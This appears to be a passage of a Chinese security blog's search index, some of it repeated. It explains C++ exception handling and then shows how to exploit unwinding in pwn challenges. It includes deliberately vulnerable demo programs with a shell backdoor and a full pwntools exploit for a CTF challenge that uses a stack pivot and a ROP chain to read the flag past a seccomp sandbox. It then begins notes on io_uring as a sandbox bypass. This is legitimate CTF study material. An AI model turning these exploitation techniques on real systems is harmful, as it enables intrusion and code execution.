(std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#catch"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#try"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#noexcept"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#pwn中的利用"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#demo1"},{"categories":["pwn"],"collections":null,"content":"pwn中的利用\rdemo1\r修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2\r修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#demo2"},{"categories":["pwn"],"collections":null,"content":"NepCTF 2025 canutrytry\r修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#nepctf-2025-canutrytry"},{"categories":["pwn"],"collections":null,"content":"逆向分析\rvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int v3; // [rsp+4h] [rbp-2Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); init(); while ( 1 ) { while ( 1 ) { menu(); std::istream::operator\u003e\u003e(\u0026std::cin, \u0026v3); if ( v3 != 1 ) break; visit(); } if ( v3 != 2 ) exit(0); leave(); } } 在init中： 开了沙箱，只允许四个系统调用，read、write、close、futex， 打开了flag，把flag读到0x4053c0 提供两个选项visit和leave **visit**中提供三个选项： **left：**根据size_list申请堆块 **right：**讲size写入size_list数组 **stright：**输入index，往相应堆块中读入数据 leave： 输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常 异常处理： 抛出异常： visit中的left如果检查到size小于等于0,就会抛出**“invalid size”** leave中如果检测到size大于0x10就会抛出**“stack overflow”** leave和visit中都没有catch，main中有两个catch(char const*)，抛出异常后都会stack unwinding，然后到main中处理 其中一个catch会泄露libc地址和栈地址 .... mov rax, cs:setbuf_ptr mov rsi, rax lea rax, format ; \"setbufaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf lea rax, [rbp+var_2C] mov rsi, rax lea rax, aStackaddrP ; \"stackaddr:%p\\n\" mov rdi, rax ; format mov eax, 0 call _printf ; } // starts at 401FAD call ___cxa_end_catch jmp loc_401ED4 抛出异常的时候并不会调用另一个catch： loc_401F2B: ; void * mov rdi, rax call ___cxa_begin_catch mov [rbp+var_20], rax ; try { call write_shellcode ; } // starts at 401F37 nop call ___cxa_end_catch call enterflag_writerbp mov eax, 0 mov rdx, [rbp+var_18] sub rdx, fs:28h jz loc_402060 loc_402060: mov rbx, [rbp+var_8] leave retn ; } // starts at 401EB3 main endp enterflag_writerbp中的另一个catch就是执行leave;ret（给了栈迁移的思路） ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:1","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#逆向分析"},{"categories":["pwn"],"collections":null,"content":"思路过程\r首先，泄露出libc和栈地址 leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch） .text:0000000000401ED4 ; try { .text:0000000000401ED4 call menu .text:0000000000401ED4 ; } // starts at 401ED4 接着写入rop链，栈迁移到这里执行rop链 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' elf = ELF(address) libc = elf.libc gdbscript = \\ \"\"\" bp 0x4019d1 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"192.168.0.1\",8000 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # pause() def cmd(choice): p.sendlineafter(b'\u003e\u003e',str(choice).encode()) def leave(index): cmd(2) p.sendlineafter(b'index: ',str(index).encode()) def left(): cmd(1) p.sendlineafter(b'\u003e\u003e',b'1') def right(size): cmd(1) p.sendlineafter(b'\u003e\u003e',b'2') p.sendlineafter(b'size:',str(size).encode()) def stright(index,content): cmd(1) p.sendlineafter(b'\u003e\u003e',b'3') p.sendlineafter(b'index:',str(index)) p.sendafter(b'content:',content) right(0x30) right(-1) left() left() p.recvuntil(b'setbufaddr:') libc.address = int(p.recv(14),16) - 0x88060 p.recvuntil(b'stackaddr:') stack = int(p.recv(14),16) success(\"libc -\u003e 0x%x\",libc.address) success(\"stack -\u003e 0x%x\",stack) pl = b'a'*0x20 + p64(stack-0x14) + p64(0x401ED4+1) #不能破坏栈 stright(0,pl) leave(0) #进入另一个catch p.recvuntil(b'now!\\n') #write(2,0x4053c0,0x20) flag_addr = 0x4053c0 #shellcode_addr = 0x405460 pop_rax_ret = 0x45eb0 + libc.address pop_rdi_ret = 0x2a3e5+ libc.address pop_rsi_ret = 0x2be51 + libc.address pop_rdx_r12_ret = 0x11f497+ libc.address rop = p64(0xdeedbeef) rop += p64(pop_rdi_ret) + p64(2) rop += p64(pop_rsi_ret) + p64(flag_addr) rop += p64(pop_rdx_r12_ret) + p64(0x100)*2 rop += p64(libc.symbols['write']) p.send(rop) # pl = p64(0x405460) pl = b'flag' p.sendafter(b'flag: ',pl) #0x405400 -\u003e 0x405460(rop) pl = b'a'*0x10 + p64(0x405460) # dbg() p.send(pl) p.interactive() # 0x0000000000045eb0 : pop rax ; ret # 0x000000000002a3e5 : pop rdi ; ret # 0x000000000002be51 : pop rsi ; ret # 0x000000000011f497 : pop rdx ; pop r12 ; ret ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:2:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#思路过程"},{"categories":["pwn"],"collections":null,"content":"参考文章\r《C++.Primer.5th.Edition_2013》 https://en.cppreference.com/w/cpp/language/try.html https://bbs.kanxue.com/thread-284745.htm C++异常处理机制及其利用研究 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:3:0","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#参考文章"},{"categories":["pwn"],"collections":null,"content":"突破沙箱规则，实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:0:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#"},{"categories":["pwn"],"collections":null,"content":"基础知识\rio_uring涉及三个系统调用 io_uring_setup(2) io_uring_register(2) io_uring_enter(2) ","date":"2025-08-23","objectID":"/posts/io_uring/:1:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#基础知识"},{"categories":["pwn"],"collections":null,"content":"io_uring_setup\r用于初始化执行异步IO的上下文 #include \u003cliburing.h\u003e int io_uring_setup(u32 entries, struct io_uring_params *p); 这个系统调用 创建一个 SQ 和一个 CQ 返回一个文件描述符，随后作为其他相关系统调用的参数 SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。 参数： entries参数： 设置SQ和CQ的初始容量至少为entries（至少是因为entries必须是2的幂次方（如32、64、512等），如果不是内核也会自动对齐到最近的更大幂次值（如传入100会被调整为128）） io_uring_params结构体： 一般都是把io_uring_params初始化然后清零，再传入io_uring_setup，内核再将一些返回的信息写入这个结构体 struct io_uring_params { __u32 sq_entries; // 实际提交队列（SQ）大小 __u32 cq_entries; // 实际完成队列（CQ）大小 __u32 flags; // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式 __u32 sq_thread_cpu; // SQ polling 线程绑定的 CPU __u32 sq_thread_idle; // SQ polling 线程空闲休眠时间 __u32 features; // 内核支持的特性标志 __u32 wq_fd; // 共享 workqueue 的 io_uring 实例 fd __u32 resv[3]; // 保留字段,必须为0 struct io_sqring_offsets sq_off; // SQ 环形队列的偏移信息 struct io_cqring_offsets cq_off; // CQ 环形队列的偏移信息 }; struct io_sqring_offsets { __u32 head; // SQ 的 head 指针（用户态消费，内核读取） __u32 tail; // SQ 的 tail 指针（用户态生产，内核读取） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// SQ ring 的 entry 总数 __u32 flags; // SQ 状态标志位 __u32 dropped; // 内核丢弃的 SQE 数量 __u32 array; // SQE 索引数组（存放 SQE 的顺序） __u32 resv1; // 保留字段 __u64 user_addr; // 用户自定义地址（较新内核引入） }; struct io_cqring_offsets { __u32 head; // CQ 的 head 指针（用户态消费） __u32 tail; // CQ 的 tail 指针（内核生产） __u32 ring_mask; // 环大小掩码，用于索引取模 __u32 ring_entries;// CQ ring 的 entry 总数 __u32 overflow; // CQ 溢出计数 __u32 cqes; // CQE 数组起始偏移 __u32 flags; // CQ 状态标志 __u32 resv1; // 保留 __u64 user_addr; // 用户自定义地址 }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:1","tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_setup"},{"categories":["pwn"],"collections":null,"content":"io_uring_enter\r#include \u003cliburing.h\u003e int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); 这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行： 提交新的 I/O 请求 等待 I/O 完成 参数： fd 是 io_uring_setup() 返回的文件描述符 to_submit 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交 min_complete默认模式，会等待这个数量的 I/O 事件完成再返回 flags用于控制内核行为 sig设置进程的信号屏蔽状态，如：是否会被Ctrl+c终止。进行orw的话，置0就行 io_uring_sqe 用于传递IO操作的具体信息 opcode：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等 /* * IO submission data structure (Submission Queue Entry) */ struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ union { __u64 off; /* offset into file */ __u64 addr2; struct { __u32 cmd_op; __u32 __pad1; }; }; union { __u64 addr; /* pointer to buffer or iovecs */ __u64 splice_off_in; struct { __u32 level; __u32 optname; }; }; __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; /* compatibility */ __u32 poll32_events; /* word-reversed for BE */ __u32 sync_range_flags; __u32 msg_flags; __u32 